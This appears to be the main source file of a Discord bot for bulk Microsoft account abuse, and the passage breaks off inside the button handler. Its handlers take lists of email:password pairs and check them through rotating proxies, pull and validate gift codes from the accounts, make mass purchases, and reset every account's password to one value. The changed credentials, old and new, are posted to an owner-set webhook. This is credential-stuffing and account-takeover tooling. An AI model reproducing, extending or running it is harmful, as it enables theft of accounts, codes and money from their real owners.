// ============================================================
//  MS Code Checker & WLID Claimer & Puller — Discord Bot
//  Supports both slash commands and dot-prefix commands
// ============================================================

const { Client, GatewayIntentBits, Partials, ActionRowBuilder, ButtonBuilder, ButtonStyle, ComponentType } = require("discord.js");
const config = require("./config");
const { AuthManager, parseDuration, formatDuration, formatExpiry } = require("./utils/auth-manager");
const { ConcurrencyLimiter } = require("./utils/concurrency");
const { OTPManager } = require("./utils/otp-manager");
const { StatsManager } = require("./utils/stats-manager");
const { sendToWebhook } = require("./utils/webhook");
const { checkCodes } = require("./utils/microsoft-checker");
const { claimWlids } = require("./utils/microsoft-claimer");
const { pullCodes } = require("./utils/microsoft-puller");
const { searchProducts, getProductDetails, purchaseItems } = require("./utils/microsoft-purchaser");
const { changePasswords, checkAccounts } = require("./utils/microsoft-changer");
const { loadProxies, isProxyEnabled, getProxyCount, getProxyStats, reloadProxies } = require("./utils/proxy-manager");
const blacklist = require("./utils/blacklist");
const { setWlids, getWlids, getWlidCount } = require("./utils/wlid-store");
const { autoRetry } = require("./utils/auto-retry");
const { AutoPullScheduler } = require("./utils/auto-pull-scheduler");
const {
  progressEmbed,
  checkResultsEmbed,
  claimResultsEmbed,
  pullFetchProgressEmbed,
  pullResultsEmbed,
  purchaseResultsEmbed,
  purchaseProgressEmbed,
  productSearchEmbed,
  changerResultsEmbed,
  accountCheckerResultsEmbed,
  errorEmbed,
  successEmbed,
  infoEmbed,
  authListEmbed,
  helpEmbed,
  adminPanelEmbed,
  detailedStatsEmbed,
  textAttachment,
} = require("./utils/embeds");

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
  partials: [Partials.Message, Partials.Channel],
});

const auth = new AuthManager();
const limiter = new ConcurrencyLimiter(config.MAX_CONCURRENT_USERS);
const otpManager = new OTPManager();
const statsManager = new StatsManager();

// Webhook URL stored in memory (owner sets via /setwebhook)
let webhookUrl = "";

// Active abort controllers per user
const activeAborts = new Map();
const autoPullScheduler = new AutoPullScheduler();

// ── Helpers ──────────────────────────────────────────────────

function isOwner(userId) {
  return userId === config.OWNER_ID;
}

function canUse(userId) {
  if (blacklist.isBlacklisted(userId)) return false;
  const allowed = isOwner(userId) || auth.isAuthorized(userId);
  if (allowed) otpManager.ensureAuthenticated(userId); // auto-session
  return allowed;
}

function splitInput(raw) {
  if (!raw) return [];
  return raw
    .split(/[\n,]+/)
    .map((s) => s.trim())
    .filter(Boolean);
}

async function fetchAttachmentLines(attachment) {
  if (!attachment) return [];
  const res = await fetch(attachment.url);
  const text = await res.text();
  return text.split("\n").map((l) => l.trim()).filter(Boolean);
}

function stopButton(userId) {
  return new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId(`stop_${userId}`)
      .setLabel("Stop")
      .setStyle(ButtonStyle.Secondary)
  );
}

async function updateProgress(msg, embed, userId) {
  try {
    await msg.edit({ embeds: [embed], components: [stopButton(userId)] });
  } catch { /* ignore rate limits */ }
}

// ── WLID Set handler ────────────────────────────────────────

async function handleWlidSet(respond, userId, wlidsRaw, wlidsFile) {
  if (!isOwner(userId)) return respond({ embeds: [errorEmbed("Only the bot owner can set WLIDs.")] });

  let wlids = splitInput(wlidsRaw);
  if (wlidsFile) {
    const lines = await fetchAttachmentLines(wlidsFile);
    wlids = wlids.concat(lines);
  }

  if (wlids.length === 0) return respond({ embeds: [errorEmbed("No WLID tokens provided. Paste them or attach a `.txt` file.")] });

  setWlids(wlids);
  return respond({ embeds: [successEmbed(`WLID tokens updated. **${wlids.length}** tokens stored.\n\nPrevious tokens have been replaced.`)] });
}

// ── Check handler ────────────────────────────────────────────

async function handleCheck(respond, userId, wlidsRaw, codesRaw, codesFile, threads = 10, dmUser = null) {
  if (!canUse(userId)) return respond({ embeds: [errorEmbed(blacklist.isBlacklisted(userId) ? "You are blacklisted." : "You are not authorized to use this bot.")] });

  const acquire = limiter.acquire(userId, "check");
  if (!acquire.ok) {
    const reason = acquire.reason === "busy"
      ? "You already have a command running. Wait for it to finish."
      : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached. Try again later.`;
    return respond({ embeds: [errorEmbed(reason)] });
  }

  const ac = new AbortController();
  activeAborts.set(userId, ac);

  try {
    let wlids = splitInput(wlidsRaw);
    if (wlids.length === 0) wlids = getWlids();
    
    let codes = splitInput(codesRaw);
    if (codesFile) codes = codes.concat(await fetchAttachmentLines(codesFile));

    if (wlids.length === 0) return respond({ embeds: [errorEmbed("No WLID tokens provided and none stored.\nUse `/wlidset` or `.wlidset` to set WLIDs first, or provide them directly.")] });
    if (codes.length === 0) return respond({ embeds: [errorEmbed("No codes provided. Use the `codes` option or attach a `.txt` file.")] });

    const msg = await respond({
      embeds: [progressEmbed(0, codes.length, `Checking codes (${wlids.length} WLIDs)`)],
      components: [stopButton(userId)],
      fetchReply: true,
    });

    let lastUpdate = Date.now();
    const results = await checkCodes(wlids, codes, threads, (done, total) => {
      const now = Date.now();
      if (now - lastUpdate > 2000) {
        lastUpdate = now;
        updateProgress(msg, progressEmbed(done, total, "Checking codes"), userId);
      }
    }, ac.signal);

    // Auto-retry failed items
    const originalItems = codes.map((code, i) => ({ code, wlidIndex: Math.floor(i / 40) }));
    const finalResults = await autoRetry(
      async (items) => {
        const retryCodes = items.map(it => it.code);
        return checkCodes(wlids, retryCodes, Math.min(threads, 5));
      },
      results,
      originalItems,
      2,
      (round, count) => {
        updateProgress(msg, progressEmbed(results.length, results.length, `Retrying ${count} failed items (round ${round})`), userId);
      }
    );

    const stopped = ac.signal.aborted;
    const files = [];
    const valid = finalResults.filter((r) => r.status === "valid");
    const used = finalResults.filter((r) => r.status === "used");
    const expired = finalResults.filter((r) => r.status === "expired");
    const invalid = finalResults.filter((r) => r.status === "invalid" || r.status === "error");

    if (valid.length > 0)
      files.push(textAttachment(valid.map((r) => (r.title ? `${r.code} | ${r.title}` : r.code)), "valid.txt"));
    if (used.length > 0)
      files.push(textAttachment(used.map((r) => r.code), "used.txt"));
    if (expired.length > 0)
      files.push(textAttachment(expired.map((r) => (r.title ? `${r.code} | ${r.title}` : r.code)), "expired.txt"));
    if (invalid.length > 0)
      files.push(textAttachment(invalid.map((r) => r.code), "invalid.txt"));

    const embed = checkResultsEmbed(finalResults);
    if (stopped) embed.setTitle("Check Results (Stopped)");

    if (dmUser) {
      try {
        await dmUser.send({ embeds: [embed], files });
        await msg.edit({ embeds: [infoEmbed("Check Complete", "Results sent to your DMs.")], components: [] });
      } catch {
        await msg.edit({ embeds: [embed], files, components: [] });
      }
    } else {
      await msg.edit({ embeds: [embed], files, components: [] });
    }
  } catch (err) {
    await respond({ embeds: [errorEmbed(`Unexpected error: ${err.message}`)] });
  } finally {
    activeAborts.delete(userId);
    limiter.release(userId);
  }
}

// ── Claim handler ────────────────────────────────────────────

async function handleClaim(respond, userId, accountsRaw, accountsFile, threads = 5, dmUser = null) {
  if (!canUse(userId)) return respond({ embeds: [errorEmbed(blacklist.isBlacklisted(userId) ? "You are blacklisted." : "You are not authorized to use this bot.")] });

  const acquire = limiter.acquire(userId, "claim");
  if (!acquire.ok) {
    const reason = acquire.reason === "busy"
      ? "You already have a command running. Wait for it to finish."
      : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached. Try again later.`;
    return respond({ embeds: [errorEmbed(reason)] });
  }

  const ac = new AbortController();
  activeAborts.set(userId, ac);

  try {
    let accounts = splitInput(accountsRaw).filter((a) => a.includes(":"));
    if (accountsFile) {
      const lines = await fetchAttachmentLines(accountsFile);
      accounts = accounts.concat(lines.filter((l) => l.includes(":")));
    }

    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided (email:password format).")] });

    const msg = await respond({
      embeds: [progressEmbed(0, accounts.length, "Claiming WLIDs")],
      components: [stopButton(userId)],
      fetchReply: true,
    });

    let lastUpdate = Date.now();
    const results = await claimWlids(accounts, threads, (done, total) => {
      const now = Date.now();
      if (now - lastUpdate > 2000) {
        lastUpdate = now;
        updateProgress(msg, progressEmbed(done, total, "Claiming WLIDs"), userId);
      }
    }, ac.signal);

    // Auto-retry failed claims
    const finalResults = await autoRetry(
      async (items) => claimWlids(items, Math.min(threads, 3)),
      results,
      accounts,
      2,
      (round, count) => {
        updateProgress(msg, progressEmbed(results.length, results.length, `Retrying ${count} failed claims (round ${round})`), userId);
      }
    );

    const stopped = ac.signal.aborted;
    const files = [];
    const success = finalResults.filter((r) => r.success && r.token);
    const failed = finalResults.filter((r) => !r.success);

    if (success.length > 0)
      files.push(textAttachment(success.map((r) => r.token), "tokens.txt"));
    if (failed.length > 0)
      files.push(textAttachment(failed.map((r) => `${r.email}: ${r.error || "Unknown error"}`), "failed.txt"));

    const embed = claimResultsEmbed(finalResults);
    if (stopped) embed.setTitle("Claim Results (Stopped)");

    if (dmUser) {
      try {
        await dmUser.send({ embeds: [embed], files });
        await msg.edit({ embeds: [infoEmbed("Claim Complete", "Results sent to your DMs.")], components: [] });
      } catch {
        await msg.edit({ embeds: [embed], files, components: [] });
      }
    } else {
      await msg.edit({ embeds: [embed], files, components: [] });
    }
  } catch (err) {
    await respond({ embeds: [errorEmbed(`Unexpected error: ${err.message}`)] });
  } finally {
    activeAborts.delete(userId);
    limiter.release(userId);
  }
}

// ── Pull handler ─────────────────────────────────────────────

async function handlePull(respond, userId, accountsRaw, accountsFile, dmUser = null) {
  if (!canUse(userId)) return respond({ embeds: [errorEmbed(blacklist.isBlacklisted(userId) ? "You are blacklisted." : "You are not authorized to use this bot.")] });

  const acquire = limiter.acquire(userId, "pull");
  if (!acquire.ok) {
    const reason = acquire.reason === "busy"
      ? "You already have a command running. Wait for it to finish."
      : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached. Try again later.`;
    return respond({ embeds: [errorEmbed(reason)] });
  }

  const ac = new AbortController();
  activeAborts.set(userId, ac);

  try {
    let accounts = splitInput(accountsRaw).filter((a) => a.includes(":"));
    if (accountsFile) {
      const lines = await fetchAttachmentLines(accountsFile);
      accounts = accounts.concat(lines.filter((l) => l.includes(":")));
    }

    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided (email:password format).")] });

    const msg = await respond({
      embeds: [pullFetchProgressEmbed({ done: 0, total: accounts.length, totalCodes: 0 })],
      components: [stopButton(userId)],
      fetchReply: true,
    });

    let lastUpdate = Date.now();
    let totalCodesSoFar = 0;
    let lastAccount = "";
    let lastCodes = 0;
    let lastError = null;

    const { fetchResults, validateResults } = await pullCodes(accounts, (phase, detail) => {
      const now = Date.now();

      if (phase === "fetch") {
        totalCodesSoFar += detail.codes;
        lastAccount = detail.email;
        lastCodes = detail.codes;
        lastError = detail.error;

        if (now - lastUpdate > 2000) {
          lastUpdate = now;
          updateProgress(msg, pullFetchProgressEmbed({
            done: detail.done,
            total: detail.total,
            totalCodes: totalCodesSoFar,
            lastAccount,
            lastCodes,
            lastError,
          }), userId);
        }
      } else if (phase === "validate_start") {
        updateProgress(msg, progressEmbed(0, detail.total, "Validating codes"), userId);
      } else if (phase === "validate") {
        if (now - lastUpdate > 2000) {
          lastUpdate = now;
          updateProgress(msg, progressEmbed(detail.done, detail.total, "Validating codes"), userId);
        }
      }
    }, ac.signal);

    const stopped = ac.signal.aborted;
    const files = [];
    const valid = validateResults.filter((r) => r.status === "valid");
    const used = validateResults.filter((r) => r.status === "used");
    const expired = validateResults.filter((r) => r.status === "expired");
    const invalid = validateResults.filter((r) => r.status === "invalid" || r.status === "error");

    if (valid.length > 0)
      files.push(textAttachment(valid.map((r) => (r.title ? `${r.code} | ${r.title}` : r.code)), "valid.txt"));
    if (used.length > 0)
      files.push(textAttachment(used.map((r) => r.code), "used.txt"));
    if (expired.length > 0)
      files.push(textAttachment(expired.map((r) => (r.title ? `${r.code} | ${r.title}` : r.code)), "expired.txt"));
    if (invalid.length > 0)
      files.push(textAttachment(invalid.map((r) => r.code), "invalid.txt"));

    const embed = pullResultsEmbed(fetchResults, validateResults);
    if (stopped) embed.setTitle("Pull Results (Stopped)");

    if (dmUser) {
      try {
        await dmUser.send({ embeds: [embed], files });
        await msg.edit({ embeds: [infoEmbed("Pull Complete", "Results sent to your DMs.")], components: [] });
      } catch {
        await msg.edit({ embeds: [embed], files, components: [] });
      }
    } else {
      await msg.edit({ embeds: [embed], files, components: [] });
    }
  } catch (err) {
    await respond({ embeds: [errorEmbed(`Unexpected error: ${err.message}`)] });
  } finally {
    activeAborts.delete(userId);
    limiter.release(userId);
  }
}

// ── Auth handler ─────────────────────────────────────────────

async function handleAuth(respond, callerId, targetId, durationStr) {
  if (!isOwner(callerId)) return respond({ embeds: [errorEmbed("Only the bot owner can authorize users.")] });

  const ms = parseDuration(durationStr);
  if (ms === null) return respond({ embeds: [errorEmbed(`Invalid duration: \`${durationStr}\`\nExamples: 1h, 7d, 30d, 1mo, forever`)] });

  auth.authorize(targetId, ms, callerId);
  const durLabel = ms === Infinity ? "Permanent" : formatDuration(ms);
  return respond({ embeds: [successEmbed(`<@${targetId}> has been authorized for **${durLabel}**.`)] });
}

async function handleDeauth(respond, callerId, targetId) {
  if (!isOwner(callerId)) return respond({ embeds: [errorEmbed("Only the bot owner can deauthorize users.")] });
  auth.deauthorize(targetId);
  return respond({ embeds: [successEmbed(`<@${targetId}> has been deauthorized.`)] });
}

async function handleAuthList(respond) {
  const entries = auth.getAllAuthorized();
  return respond({ embeds: [authListEmbed(entries)] });
}

async function handleStats(respond) {
  const activeCount = limiter.getActiveCount();
  const authCount = auth.getAllAuthorized().length;
  const wlidCount = getWlidCount();
  const blCount = blacklist.getCount();
  const proxyStatus = isProxyEnabled() ? `Enabled (${getProxyCount()} loaded)` : "Disabled";
  const ps = getProxyStats();
  const proxyLine = isProxyEnabled()
    ? `Proxies: \`${proxyStatus}\`\nProxy requests: \`${ps.total}\` (${ps.successRate}% success)`
    : `Proxies: \`${proxyStatus}\``;

  return respond({
    embeds: [
      infoEmbed(
        "Bot Status",
        [
          `Active sessions: \`${activeCount}/${config.MAX_CONCURRENT_USERS}\``,
          `Authorized users: \`${authCount}\``,
          `Blacklisted users: \`${blCount}\``,
          `Stored WLIDs: \`${wlidCount}\``,
          proxyLine,
          `Uptime: \`${formatUptime(process.uptime())}\``,
          `Ping: \`${client.ws.ping}ms\``,
        ].join("\n")
      ),
    ],
  });
}

// ── Blacklist handlers ──────────────────────────────────────

async function handleBlacklist(respond, callerId, targetId, reason) {
  if (!isOwner(callerId)) return respond({ embeds: [errorEmbed("Only the bot owner can blacklist users.")] });
  if (targetId === callerId) return respond({ embeds: [errorEmbed("You cannot blacklist yourself.")] });
  blacklist.add(targetId, reason || "No reason");
  return respond({ embeds: [successEmbed(`<@${targetId}> has been blacklisted.\nReason: ${reason || "No reason"}`)] });
}

async function handleUnblacklist(respond, callerId, targetId) {
  if (!isOwner(callerId)) return respond({ embeds: [errorEmbed("Only the bot owner can unblacklist users.")] });
  const removed = blacklist.remove(targetId);
  if (!removed) return respond({ embeds: [errorEmbed("That user is not blacklisted.")] });
  return respond({ embeds: [successEmbed(`<@${targetId}> has been removed from the blacklist.`)] });
}

async function handleBlacklistShow(respond) {
  const entries = blacklist.getAll();
  if (entries.length === 0) {
    return respond({ embeds: [infoEmbed("Blacklist", "No blacklisted users.")] });
  }
  const lines = entries.map((e, i) => {
    const date = `<t:${Math.floor(e.addedAt / 1000)}:R>`;
    return `\`${i + 1}.\` <@${e.userId}> — ${e.reason} (${date})`;
  });
  return respond({ embeds: [infoEmbed("Blacklist", lines.join("\n"))] });
}

function formatUptime(seconds) {
  const d = Math.floor(seconds / 86400);
  const h = Math.floor((seconds % 86400) / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);
  return `${d}d ${h}h ${m}m ${s}s`;
}

// ── Purchase handler ─────────────────────────────────────────

async function handlePurchase(respond, userId, accountsRaw, accountsFile, productUrl, dmUser = null) {
  if (!canUse(userId)) return respond({ embeds: [errorEmbed(blacklist.isBlacklisted(userId) ? "You are blacklisted." : "You are not authorized to use this bot.")] });

  const acquire = limiter.acquire(userId, "purchase");
  if (!acquire.ok) {
    const reason = acquire.reason === "busy"
      ? "You already have a command running. Wait for it to finish."
      : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached. Try again later.`;
    return respond({ embeds: [errorEmbed(reason)] });
  }

  const ac = new AbortController();
  activeAborts.set(userId, ac);

  try {
    let accounts = splitInput(accountsRaw).filter((a) => a.includes(":"));
    if (accountsFile) {
      const lines = await fetchAttachmentLines(accountsFile);
      accounts = accounts.concat(lines.filter((l) => l.includes(":")));
    }

    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided (email:password format).")] });
    if (!productUrl) return respond({ embeds: [errorEmbed("No product URL or ID provided.")] });

    // Extract product ID from URL or use directly
    let productId = productUrl.trim();
    const urlMatch = productId.match(/\/store\/[^/]+\/([a-zA-Z0-9]{12})/i) || productId.match(/\/p\/([a-zA-Z0-9]{12})/i);
    if (urlMatch) productId = urlMatch[1];

    // If it looks like a search query instead of an ID, search first
    if (productId.length > 12 || productId.includes(" ")) {
      const searchResults = await searchProducts(productId);
      if (searchResults.length === 0) return respond({ embeds: [errorEmbed(`No products found for: ${productId}`)] });
      
      const embed = productSearchEmbed(searchResults.slice(0, 5));
      return respond({ embeds: [embed, infoEmbed("Tip", "Copy the product ID and run the command again with it.")] });
    }

    // Get product details
    const product = await getProductDetails(productId);
    if (!product) return respond({ embeds: [errorEmbed(`Product not found: ${productId}`)] });
    if (!product.skus || product.skus.length === 0) return respond({ embeds: [errorEmbed(`No purchasable SKUs found for: ${product.title}`)] });

    // Use the first available SKU
    const sku = product.skus[0];

    const msg = await respond({
      embeds: [purchaseProgressEmbed({
        product: product.title,
        price: `${sku.price} ${sku.currency}`,
        done: 0,
        total: accounts.length,
        status: "Starting",
      })],
      components: [stopButton(userId)],
      fetchReply: true,
    });

    let lastUpdate = Date.now();
    const results = await purchaseItems(
      accounts,
      productId,
      sku.skuId,
      sku.availabilityId,
      (phase, detail) => {
        const now = Date.now();
        if (now - lastUpdate > 2000) {
          lastUpdate = now;
          let status = "Processing";
          if (phase === "login") status = `Logging in: ${detail.email}`;
          else if (phase === "cart") status = `Getting cart: ${detail.email}`;
          else if (phase === "purchase") status = `Purchasing: ${detail.email}`;
          else if (phase === "result") status = detail.success ? `Purchased: ${detail.email}` : `Failed: ${detail.email}`;

          updateProgress(msg, purchaseProgressEmbed({
            product: product.title,
            price: `${sku.price} ${sku.currency}`,
            done: detail.done || 0,
            total: detail.total || accounts.length,
            status,
          }), userId);
        }
      },
      ac.signal
    );

    const stopped = ac.signal.aborted;
    const files = [];
    const successful = results.filter(r => r.success);
    const failed = results.filter(r => !r.success);

    if (successful.length > 0)
      files.push(textAttachment(successful.map(r => `${r.email} | ${r.orderId || "OK"}`), "purchased.txt"));
    if (failed.length > 0)
      files.push(textAttachment(failed.map(r => `${r.email} | ${r.error || "Failed"}`), "failed.txt"));

    const embed = purchaseResultsEmbed(results, product.title, `${sku.price} ${sku.currency}`);
    if (stopped) embed.setTitle("Purchase Results (Stopped)");

    if (dmUser) {
      try {
        await dmUser.send({ embeds: [embed], files });
        await msg.edit({ embeds: [infoEmbed("Purchase Complete", "Results sent to your DMs.")], components: [] });
      } catch {
        await msg.edit({ embeds: [embed], files, components: [] });
      }
    } else {
      await msg.edit({ embeds: [embed], files, components: [] });
    }
  } catch (err) {
    await respond({ embeds: [errorEmbed(`Unexpected error: ${err.message}`)] });
  } finally {
    activeAborts.delete(userId);
    limiter.release(userId);
  }
}

// ── Search handler ───────────────────────────────────────────

async function handleSearch(respond, query) {
  if (!query) return respond({ embeds: [errorEmbed("Provide a search query.")] });

  const results = await searchProducts(query);
  if (results.length === 0) return respond({ embeds: [errorEmbed(`No results for: ${query}`)] });

  return respond({ embeds: [productSearchEmbed(results.slice(0, 10))] });
}

// ── Changer handler ──────────────────────────────────────────

async function handleChanger(respond, userId, accountsRaw, accountsFile, newPassword, threads = 5, dmUser = null) {
  if (!canUse(userId)) return respond({ embeds: [errorEmbed(blacklist.isBlacklisted(userId) ? "You are blacklisted." : "You are not authorized to use this bot.")] });

  const acquire = limiter.acquire(userId, "changer");
  if (!acquire.ok) {
    const reason = acquire.reason === "busy"
      ? "You already have a command running. Wait for it to finish."
      : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached. Try again later.`;
    return respond({ embeds: [errorEmbed(reason)] });
  }

  const ac = new AbortController();
  activeAborts.set(userId, ac);

  try {
    let accounts = splitInput(accountsRaw).filter((a) => a.includes(":"));
    if (accountsFile) {
      const lines = await fetchAttachmentLines(accountsFile);
      accounts = accounts.concat(lines.filter((l) => l.includes(":")));
    }

    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided (email:password format).")] });
    if (!newPassword) return respond({ embeds: [errorEmbed("No new password provided.")] });
    if (newPassword.length < 8) return respond({ embeds: [errorEmbed("New password must be at least 8 characters.")] });

    const msg = await respond({
      embeds: [progressEmbed(0, accounts.length, "Changing passwords")],
      components: [stopButton(userId)],
      fetchReply: true,
    });

    let lastUpdate = Date.now();
    const results = await changePasswords(accounts, newPassword, threads, (done, total) => {
      const now = Date.now();
      if (now - lastUpdate > 2000) {
        lastUpdate = now;
        updateProgress(msg, progressEmbed(done, total, "Changing passwords"), userId);
      }
    }, ac.signal);

    const stopped = ac.signal.aborted;
    const files = [];
    const success = results.filter(r => r.success);
    const failed = results.filter(r => !r.success);

    if (success.length > 0)
      files.push(textAttachment(success.map(r => `${r.email}:${r.newPassword}`), "changed.txt"));
    if (failed.length > 0)
      files.push(textAttachment(failed.map(r => `${r.email}: ${r.error || "Failed"}`), "failed.txt"));

    const embed = changerResultsEmbed(results);
    if (stopped) embed.setTitle("Changer Results (Stopped)");

    // Send successful changes to webhook + record stats
    for (const r of success) {
      statsManager.record(userId, "changer", true);
      sendToWebhook(webhookUrl, {
        email: r.email,
        oldPassword: r.oldPassword || "N/A",
        newPassword: r.newPassword,
        userId,
      });
    }
    for (const r of failed) {
      statsManager.record(userId, "changer", false);
    }

    if (dmUser) {
      try {
        await dmUser.send({ embeds: [embed], files });
        await msg.edit({ embeds: [infoEmbed("Changer Complete", "Results sent to your DMs.")], components: [] });
      } catch {
        await msg.edit({ embeds: [embed], files, components: [] });
      }
    } else {
      await msg.edit({ embeds: [embed], files, components: [] });
    }
  } catch (err) {
    await respond({ embeds: [errorEmbed(`Unexpected error: ${err.message}`)] });
  } finally {
    activeAborts.delete(userId);
    limiter.release(userId);
  }
}

// ── Account checker handler ──────────────────────────────────

async function handleAccountChecker(respond, userId, accountsRaw, accountsFile, threads = 5, dmUser = null) {
  if (!canUse(userId)) return respond({ embeds: [errorEmbed(blacklist.isBlacklisted(userId) ? "You are blacklisted." : "You are not authorized to use this bot.")] });

  const acquire = limiter.acquire(userId, "checker");
  if (!acquire.ok) {
    const reason = acquire.reason === "busy"
      ? "You already have a command running. Wait for it to finish."
      : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached. Try again later.`;
    return respond({ embeds: [errorEmbed(reason)] });
  }

  const ac = new AbortController();
  activeAborts.set(userId, ac);

  try {
    let accounts = splitInput(accountsRaw).filter((a) => a.includes(":"));
    if (accountsFile) {
      const lines = await fetchAttachmentLines(accountsFile);
      accounts = accounts.concat(lines.filter((l) => l.includes(":")));
    }

    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided (email:password format).") ] });

    const msg = await respond({
      embeds: [progressEmbed(0, accounts.length, "Checking accounts")],
      components: [stopButton(userId)],
      fetchReply: true,
    });

    let lastUpdate = Date.now();
    const results = await checkAccounts(accounts, threads, (done, total) => {
      const now = Date.now();
      if (now - lastUpdate > 2000) {
        lastUpdate = now;
        updateProgress(msg, progressEmbed(done, total, "Checking accounts"), userId);
      }
    }, ac.signal);

    const stopped = ac.signal.aborted;
    const files = [];
    const valid = results.filter((r) => r.status === "valid");
    const locked = results.filter((r) => r.status === "locked");
    const invalid = results.filter((r) => r.status === "invalid");
    const failed = results.filter((r) => r.status !== "valid");

    if (valid.length > 0) files.push(textAttachment(valid.map((r) => `${r.email}`), "valid.txt"));
    if (locked.length > 0) files.push(textAttachment(locked.map((r) => `${r.email}: Account locked`), "locked.txt"));
    if (invalid.length > 0) files.push(textAttachment(invalid.map((r) => `${r.email}: Invalid credentials`), "invalid.txt"));
    if (failed.length > 0) files.push(textAttachment(failed.map((r) => `${r.email}: ${r.error || r.status || "Failed"}`), "failed.txt"));

    const embed = accountCheckerResultsEmbed(results);
    if (stopped) embed.setTitle("Account Checker Results (Stopped)");

    if (dmUser) {
      try {
        await dmUser.send({ embeds: [embed], files });
        await msg.edit({ embeds: [infoEmbed("Checker Complete", "Results sent to your DMs.")], components: [] });
      } catch {
        await msg.edit({ embeds: [embed], files, components: [] });
      }
    } else {
      await msg.edit({ embeds: [embed], files, components: [] });
    }
  } catch (err) {
    await respond({ embeds: [errorEmbed(`Unexpected error: ${err.message}`)] });
  } finally {
    activeAborts.delete(userId);
    limiter.release(userId);
  }
}

// ── Admin handlers ──────────────────────────────────────────

async function handleAdminPanel(respond, callerId) {
  if (!isOwner(callerId)) return respond({ embeds: [errorEmbed("Admin only.")] });

  const stats = statsManager.getSummary();
  const authCount = auth.getAllAuthorized().length;
  const otpSessions = otpManager.getActiveSessionCount();
  const activeProcesses = limiter.getActiveCount();
  const hasWebhook = !!webhookUrl;

  return respond({ embeds: [adminPanelEmbed(stats, authCount, otpSessions, activeProcesses, hasWebhook)] });
}

async function handleSetWebhook(respond, callerId, url) {
  if (!isOwner(callerId)) return respond({ embeds: [errorEmbed("Admin only.")] });

  if (!url.startsWith("https://discord.com/api/webhooks/")) {
    return respond({ embeds: [errorEmbed("Invalid webhook URL format.")] });
  }

  webhookUrl = url;
  return respond({ embeds: [successEmbed("Webhook URL configured successfully!")] });
}

async function handleBotStats(respond, callerId) {
  if (!isOwner(callerId)) return respond({ embeds: [errorEmbed("Admin only.")] });

  const stats = statsManager.getSummary();
  const topUsers = statsManager.getTopUsers(5);
  return respond({ embeds: [detailedStatsEmbed(stats, topUsers)] });
}

// ── Auto-Pull handler ───────────────────────────────────────

async function handleAutoPull(respond, userId, channelId, channel, accountsRaw, accountsFile, intervalStr, action = "start") {
  if (!isOwner(userId)) return respond({ embeds: [errorEmbed("Only the bot owner can manage auto-pull.")] });

  if (action === "stop") {
    const cancelled = autoPullScheduler.cancel(channelId);
    if (cancelled) return respond({ embeds: [successEmbed("Auto-pull cancelled for this channel.")] });
    return respond({ embeds: [errorEmbed("No auto-pull scheduled for this channel.")] });
  }

  if (action === "list") {
    const jobs = autoPullScheduler.getAll();
    if (jobs.length === 0) return respond({ embeds: [infoEmbed("Auto-Pull Jobs", "No scheduled jobs.")] });
    const lines = jobs.map((j, i) => {
      const next = j.nextRun ? `<t:${Math.floor(j.nextRun / 1000)}:R>` : "N/A";
      const last = j.lastRun ? `<t:${Math.floor(j.lastRun / 1000)}:R>` : "Never";
      return `\`${i + 1}.\` <#${j.channelId}> — ${j.accounts} accounts, every ${j.interval}\n    Runs: \`${j.runCount}\` | Last: ${last} | Next: ${next}${j.running ? " | **Running**" : ""}`;
    });
    return respond({ embeds: [infoEmbed("Auto-Pull Jobs", lines.join("\n\n"))] });
  }

  // Start
  let accounts = splitInput(accountsRaw).filter((a) => a.includes(":"));
  if (accountsFile) {
    const lines = await fetchAttachmentLines(accountsFile);
    accounts = accounts.concat(lines.filter((l) => l.includes(":")));
  }

  if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided.")] });
  if (!intervalStr) return respond({ embeds: [errorEmbed("No interval provided. Example: 6h, 12h, 1d")] });

  const intervalMs = autoPullScheduler.parseInterval(intervalStr);
  if (!intervalMs || intervalMs < 30 * 60 * 1000) {
    return respond({ embeds: [errorEmbed("Invalid or too short interval. Minimum 30m. Examples: 30m, 6h, 12h, 1d")] });
  }

  autoPullScheduler.schedule(
    channelId,
    accounts,
    intervalMs,
    async (accts) => {
      const { fetchResults, validateResults } = await pullCodes(accts, () => {});
      return { fetchResults, validateResults };
    },
    async (results, runCount) => {
      try {
        const { fetchResults, validateResults } = results;
        const files = [];
        const valid = validateResults.filter((r) => r.status === "valid");
        const used = validateResults.filter((r) => r.status === "used");
        const expired = validateResults.filter((r) => r.status === "expired");

        if (valid.length > 0) files.push(textAttachment(valid.map((r) => (r.title ? `${r.code} | ${r.title}` : r.code)), "valid.txt"));
        if (used.length > 0) files.push(textAttachment(used.map((r) => r.code), "used.txt"));
        if (expired.length > 0) files.push(textAttachment(expired.map((r) => (r.title ? `${r.code} | ${r.title}` : r.code)), "expired.txt"));

        const embed = pullResultsEmbed(fetchResults, validateResults);
        embed.setTitle(`Auto-Pull Results (Run #${runCount})`);
        await channel.send({ embeds: [embed], files });
      } catch (err) {
        console.error("[AutoPull] Failed to send results:", err);
      }
    }
  );

  return respond({ embeds: [successEmbed(`Auto-pull scheduled every **${intervalStr}** for **${accounts.length}** accounts.\nResults will be posted in this channel.\n\nUse \`/autopull stop\` to cancel.`)] });
}

// ── Slash Commands ───────────────────────────────────────────

client.on("interactionCreate", async (interaction) => {
  // Handle stop button clicks
  if (interaction.isButton() && interaction.customId.startsWith("stop_")) {
    const targetUserId = interaction.customId.replace("stop_", "");
    if (interaction.user.id !== targetUserId && !isOwner(interaction.user.id)) {
      return interaction.reply({ content: "Only the command author can stop this.", ephemeral: true });
    }
    const ac = activeAborts.get(targetUserId);
    if (ac) {
      ac.abort();
      await interaction.reply({ embeds: [infoEmbed("Stopped", "Process is stopping. Partial results will be shown.")], ephemeral: true });
    } else {
      await interaction.reply({ content: "No active process found.", ephemeral: true });
